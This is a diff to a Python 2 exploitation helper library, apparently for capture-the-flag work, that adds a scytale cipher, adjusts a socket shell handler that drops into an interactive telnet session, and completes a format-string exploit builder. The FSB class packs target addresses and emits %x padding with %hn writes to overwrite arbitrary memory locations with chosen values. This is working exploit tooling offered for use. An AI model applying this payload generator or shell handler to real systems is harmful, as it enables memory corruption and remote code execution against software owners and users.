@@ -1,4 +1,5 @@
 import os
+from collections import OrderedDict
 import socket
 import telnetlib
 import sys
@@ -13,10 +14,18 @@ def _rotN(c, n):
 
 	return c
 
-def rotN( st, num=13 ):
+def rotN(st, num=13):
 	return ''.join( _rotN(ch, num) for ch in st )
 
 
+
+def scytale(st, num=5):
+	s = ''
+	n = 0
+	for i in range(len(st)):
+		s += st[n%len(st)]
+		n += num
+	return s
 
 table = {'.-' : 'A',    '-...': 'B',   '-.-.': 'C',
 	'-..' : 'D',    '.'   : 'E',   '..-.': 'F',
@@ -121,7 +130,7 @@ class Pwning:
         def shell(self):
                 t = telnetlib.Telnet()
                 t.sock = self.s
-		self.write("PWNED\n")
+		self.write("echo PWNED\n")
 		self.read_until("PWNED")
                 print "4ll y0u n33d i5 5HELL!"
                 t.interact()
@@ -170,33 +179,38 @@ class Shellcode:
 class FSB:
 	#TODO
 	#64bit Ver.
+	#debug = True
 
         def __init__(self, offset, header=''):
                 self.payload = ''
+		self.header = header
 		self.offset = offset
-		
-	def sort(self, addr):
-		sort_addr = []
-		return addr		
+		self.addr = {}
 		
         def rewrite(self, src, dest):
 		lsb = ( dest & 0x0000FFFF ) >> 0
 		msb = ( dest & 0xFFFF0000 ) >> 16
 		
-		addr = {}
-		addr[hex(src)] = lsb
-		addr[hex(src + 2)] = msb
-		
-		print self.sort(addr)
-		
-	#payload 
-        def get(self):
-                return self.payload
+		self.addr[hex(src)] = lsb
+		self.addr[hex(src + 2)] = msb
 
+        def get(self):
+		addr = OrderedDict(sorted(self.addr.items(), key=lambda x:x[1]))
+		for k in addr.keys():
+			self.payload += p32(int(k, 16))
+	
+		for k in addr.keys():
+			if k == addr.keys()[0]:
+				self.payload += "%" + str(addr[k] - len(self.payload)) + "x"
+				self.payload += "%" + str(self.offset) + "$hn"
+				calculated = addr[k]
+			else:
+				self.payload += "%" + str(addr[k] - calculated) + "x"
+				self.payload += "%" + str(self.offset) + "$hn"
+				calculated = addr[k]
+			self.offset += 1
+
+		return self.payload
 class Heap:
 	def __init__(self):
 		pass
-
-
-fsb = FSB(offset=7)
-fsb.rewrite( 0x12345678, 0xffffffff )
